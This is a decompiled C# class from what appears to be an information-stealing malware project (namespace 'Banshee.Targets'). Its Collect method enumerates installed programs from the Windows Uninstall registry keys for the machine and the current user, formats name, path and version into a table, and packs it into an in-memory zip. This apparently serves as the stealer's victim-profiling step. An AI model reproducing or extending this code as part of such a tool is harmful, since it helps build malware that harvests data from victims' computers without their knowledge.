﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Banshee.Helper.Data;
using Microsoft.Win32;

namespace Banshee.Targets.Device
{
	// Token: 0x02000056 RID: 86
	public class InstalledPrograms : ITarget
	{
		// Token: 0x060000D8 RID: 216 RVA: 0x00006D10 File Offset: 0x00006D10
		public void Collect(InMemoryZip zip, Counter counter)
		{
			List<InstalledPrograms.InstalledProgram> list = new string[]
			{
				"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
				"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
			}.SelectMany((string key) => InstalledPrograms.GetInstalledPrograms(key, Registry.LocalMachine, counter).Concat(InstalledPrograms.GetInstalledPrograms(key, Registry.CurrentUser, counter))).ToList<InstalledPrograms.InstalledProgram>();
			if (list.Count != 0)
			{
				int maxName = Math.Max("Name".Length, list.Max(delegate(InstalledPrograms.InstalledProgram p)
				{
					string name = p.Name;
					if (name == null)
					{
						return 0;
					}
					return name.Length;
				}));
				int maxVersion = Math.Max("Version".Length, list.Max(delegate(InstalledPrograms.InstalledProgram p)
				{
					string version = p.Version;
					if (version == null)
					{
						return 0;
					}
					return version.Length;
				}));
				int maxPath = Math.Max("Path".Length, list.Max(delegate(InstalledPrograms.InstalledProgram p)
				{
					string installLocation = p.InstallLocation;
					if (installLocation == null)
					{
						return 0;
					}
					return installLocation.Length;
				}));
				List<string> list2 = new List<string>
				{
					string.Concat(new string[]
					{
						"Name".PadRight(maxName),
						" | ",
						"Path".PadRight(maxPath),
						" | ",
						"Version".PadRight(maxVersion)
					}),
					new string('-', maxName + maxPath + maxVersion + 6)
				};
				list2.AddRange(from p in list
				select string.Concat(new string[]
				{
					(p.Name ?? "Unknown").PadRight(maxName),
					" | ",
					(p.InstallLocation ?? "Unknown").PadRight(maxPath),
					" | ",
					(p.Version ?? "Unknown").PadRight(maxVersion)
				}));
				zip.AddTextFile("InstalledPrograms.txt", string.Join("\n", list2));
			}
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x00006ECC File Offset: 0x00006ECC
		private static List<InstalledPrograms.InstalledProgram> GetInstalledPrograms(string uninstallKey, RegistryKey root, Counter counter)
		{
			ConcurrentBag<InstalledPrograms.InstalledProgram> installedPrograms = new ConcurrentBag<InstalledPrograms.InstalledProgram>();
			using (RegistryKey registryKey = root.OpenSubKey(uninstallKey))
			{
				if (registryKey == null)
				{
					return new List<InstalledPrograms.InstalledProgram>();
				}
				string[] subKeyNames = registryKey.GetSubKeyNames();
				if (subKeyNames == null || subKeyNames.Length == 0)
				{
					return new List<InstalledPrograms.InstalledProgram>();
				}
				Parallel.ForEach<string>(subKeyNames, delegate(string subkeyName)
				{
					try
					{
						using (RegistryKey registryKey2 = root.OpenSubKey(uninstallKey + "\\" + subkeyName))
						{
							string text = ((registryKey2 != null) ? registryKey2.GetValue("DisplayName") : null) as string;
							if (!string.IsNullOrEmpty(text))
							{
								InstalledPrograms.InstalledProgram item = new InstalledPrograms.InstalledProgram
								{
									Name = text.Trim(),
									Version = ((registryKey2.GetValue("DisplayVersion") as string) ?? "Unknown"),
									InstallLocation = ((registryKey2.GetValue("InstallLocation") as string) ?? "Unknown")
								};
								installedPrograms.Add(item);
							}
						}
					}
					catch
					{
					}
				});
			}
			return installedPrograms.ToList<InstalledPrograms.InstalledProgram>();
		}

		// Token: 0x02000057 RID: 87
		private class InstalledProgram
		{
			// Token: 0x1700000F RID: 15
			// (get) Token: 0x060000DB RID: 219 RVA: 0x00006F68 File Offset: 0x00006F68
			// (set) Token: 0x060000DC RID: 220 RVA: 0x00006F70 File Offset: 0x00006F70
			public string Name { get; set; }

			// Token: 0x17000010 RID: 16
			// (get) Token: 0x060000DD RID: 221 RVA: 0x00006F79 File Offset: 0x00006F79
			// (set) Token: 0x060000DE RID: 222 RVA: 0x00006F81 File Offset: 0x00006F81
			public string Version { get; set; }

			// Token: 0x17000011 RID: 17
			// (get) Token: 0x060000DF RID: 223 RVA: 0x00006F8A File Offset: 0x00006F8A
			// (set) Token: 0x060000E0 RID: 224 RVA: 0x00006F92 File Offset: 0x00006F92
			public string InstallLocation { get; set; }
		}
	}
}
